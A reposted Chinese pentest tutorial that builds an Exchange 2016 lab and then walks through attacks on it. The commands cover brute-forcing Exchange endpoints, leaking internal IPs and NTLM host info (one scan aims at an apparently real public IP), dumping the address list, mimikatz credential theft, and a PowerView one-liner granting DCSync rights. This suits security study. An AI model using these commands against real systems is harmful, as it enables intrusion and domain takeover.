<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Z-D-JOuAtGzXsjaDycCSMA)

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFz5oVmP3pWZTM2ChNh0oxxCvnehAwzgmDqnhhFm2V30CtS0chQAHB4Q/640?wx_fmt=png&from=appmsg)

#### 域内部署 Exchange

首先这里环境的话是：

```
DC: win2012
exchange服务器: win2012
exchange 2016

```

首先我们去装 win2012 虚拟机的时候需要给两个网卡，一个是内网，一个是外网的网卡。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFYiauB6qwc0MUfvF0a84jHeKic50RVzCicXtiabmVIb9SLmJJoVYWzsxA4w/640?wx_fmt=png&from=appmsg)

内网的 dns 设置为域控的 IP。

外网就不需要指定 ip 了。

首先需要安装. net4.8 这里的话是需要连网的。

下载地址：https://support.microsoft.com/zh-cn/topic/%E9%80%82%E7%94%A8%E4%BA%8E-windows-%E7%9A%84-microsoft-net-framework-4-8-%E8%84%B1%E6%9C%BA%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F-9d23f658-3b97-68ab-d013-aa3c3e7495e0

下载之后拉到 windows2012 中，双击安装即可。

再去安装： 这里需要在 powershell 中安装。

```
Install-WindowsFeature RSAT-ADDS

```

紧接着在 powershel 中执行如下:

```
 Install-WindowsFeature AS-HTTP-Activation, Desktop-Experience, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, Web-Mgmt-Console, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation

```

装完以上这个之后 再去装 UcmaRuntimeSetup  这里也需要联网 。

下载地址:https://download.microsoft.com/download/4/A/5/4A5559C5-FFA0-4C23-AFA7-D235AC73DD13/UcmaRuntimeSetup.exe

记住如上的操作每装一个东西重启一次即可，防止出错。

紧接着就可以去装 exchange 了。

我们下载的 exchange 是这个样子的。是一个 iso 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFUerKKsGYdNoKKntuTYqd9Ll8fWWSibEugHQficuNVV8n7jFia1BaEEaAw/640?wx_fmt=png&from=appmsg)

我们拉到虚拟机里面，然后直接双击，里面有一个 EXE 文件。

再次双击 EXEW 文件，选择解压路径，然后解压即可。

解压之后里面有一个 setup 的文件。

然后 powershell 切换到解压的目录执行:

```
setup /IAcceptExchangeServerLicenseTerms /PrepareSchema
设置组织名称: .\Setup /preparead /IAcceptExchangeServerLicenseTerms /OrganizationName "exchangeorg"'
安装授权: .\Setup /prepareALLDomains  /IAcceptExchangeServerLicenseTerms

```

执行完上面的命令之后，然后双击目录里面的 setup.exe 文件就可以安装了。

具体安装的话可以参考:https://blog.51cto.com/hwg1227/5453511 只需要看后半部分即可。

接下来我们就可以测试收发邮件了。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFmEeZ8poCKxClOqyXhMicfkSTiaa1Oyh22F7BAMyULu43DSjR4iaqGu9Ww/640?wx_fmt=png&from=appmsg)

#### Exchange 相关漏洞利用

##### 爆破

在如下接口都是可以进行暴力破解的，而且支持 Basic 认证方式。

```
/ecp,/ews,/oab,/owa,/rpc,/api,/mapi,/powershell,/autodiscover,/Microsoft-Server-ActiveSync

```

这里可以使用如下工具进行查找可以爆破的接口:

https://github.com/grayddq/EBurst

```
python EBurst.py -L users.txt -p Admin123.. -d exchange-server.relaysec.com

```

##### 泄露内网 IP

原始的数据包里面包含 Host 头，这里我们将 Host 头去掉并且将 HTTP/1.1 改为 HTTP/1.0 然后请求路径为 / owa，可以看到响应包里面的 10.115.34.15 就是它内网的 IP 地址。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFicJdaFvSGh6RGGORGOrTvV3P1UskvSt3FnXLQG6csEP1yHYIDnsIStA/640?wx_fmt=png&from=appmsg)

可以匹配的接口有:

```
/Microsoft-Server-ActiveSync/default.eas
/Microsoft-Server-ActiveSync
/Autodiscover/Autodiscover.xml
/Autodiscover
/Exchange
/Rpc
/EWS/Exchange.asmx
/EWS/Services.wsdl
/EWS
/ecp
/OAB
/OWA
/aspnet_client
/PowerShell

```

这里需要注意的是如果测试后面没加 / 比如 / owa, 有些环境会重定向到 / owa/ 可能导致无法获取到 IP。

也可以使用 MSF 来进行操作。

auxiliary/scanner/http/owa_iis_internal_ip 这里就不演示了。

##### 泄露 Exchange 服务器操作系统，主机名，Netbios 名

由于支持 ntlm 认证，在 type2 返回 Challenge 的过程中，同时返回了操作系统类型，主机名，netbios 名等等。这也就意味着如果我们给服务器发送一个 type1 的请求，服务器返回 type2 的响应，这一步，我们就可以得到很多信息。

因此我们可以获取很多信息了, 这里使用 nmap 进行扫描

```
sudo nmap 61.214.142.80  -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFY3TflZkmAiczQzQz4jRaUPYpd8EN00lYGdp6aLic2dtzQsxcjscby57A/640?wx_fmt=png&from=appmsg)

#### 导出邮箱列表

##### 使用 MailSniper.ps1

下载地址：https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1

```
Get-GlobalAddressList -ExchHostname exchange服务器的前缀名 -UserName relaysec\win2012 -Password Admin123.. -OutFile global-address-list.txt

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFbaAIvKfqWb45q8f26e6Hz0tBMdL9J1K2nOCTYtaa7S7ickQgIXlCo3w/640?wx_fmt=png&from=appmsg)

##### 使用 impacket 底下的 exchanger.py

首先查出有那些列表

```
python exchanger.py relaysec/win2012:Admin123..@exchange服务器的ip nspi list-tables

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFSAiag8LlZ7I7syhRaJMibmbRsuIEt65O4hzgvDrr3LtOHPngbS2vYuVg/640?wx_fmt=png&from=appmsg)

如上有这些列表，比如我们要查看所有的用户。这里可以根据 guid 来进行查询。

```
python exchanger.py relaysec/win2012:Admin123..@exchange服务器的ip nspi dump-tables -guid xxx

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVF4NvwRK4iaYo30vCnwJHBULznCIp3cB28txNU95Jk6qEAiaTOWoElv9BQ/640?wx_fmt=png&from=appmsg)

#### 域内定位 Exchange 服务器

##### setspn -Q IMAP/*

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFA5b5F0Q0OutCknUAgSfFP6dBhaSKjVddPxSSwKpRjSksasuCm593Tg/640?wx_fmt=png&from=appmsg)

##### Exchange 内部的域管凭据

拿到 Exchange 服务器, 有很大概率就是域管直接登录的. 或者域管曾经登录过. 拿到 Exchange 服务器权限的时候, 可以尝试直接 dir 下域控的 C 盘, 看有没有权限. 如果没有权限, 再尝试使用 mimikatz 抓一波密码，很大概率可以直接抓到域管或者高权限用户. 而且就算是高版本的 server, 在 Exchange 上也能抓到明文密码.

##### Exchange 的 ACL

所有的 Exchange Server 都在`Exchange Windows Permissions`组里面, 而这个组默认就对域有 WriteACL 权限, 那么当我们拿下 Exchange 服务器的时候, 就可以尝试使用 WriteACL 赋予自身 Dcsync 的权限.

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2moGT0f0DMuZibavCIBzKDcVFQ51h50t3YwctvliaMuAY7pib8kz1oCmamicputwTVejo5E34XeNROMRSA/640?wx_fmt=png&from=appmsg)

使用 powerview，为当前 exchange 机器名用户增加 dcsync 权限 (此处需要使用 dev 分枝中的 powerview)

```
powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity 'DC=relaysec,DC=com' -PrincipalIdentity exchange-sevrer$ -Rights DCSync -Verbose}"

```

由于这个权限, Exchange 的 RCE 常用以在内网渗透中用来提升到域管权限.

因此在 CVE-2019-1040 中, 除了可以攻击 DC, 也有人选择攻击 Exchange.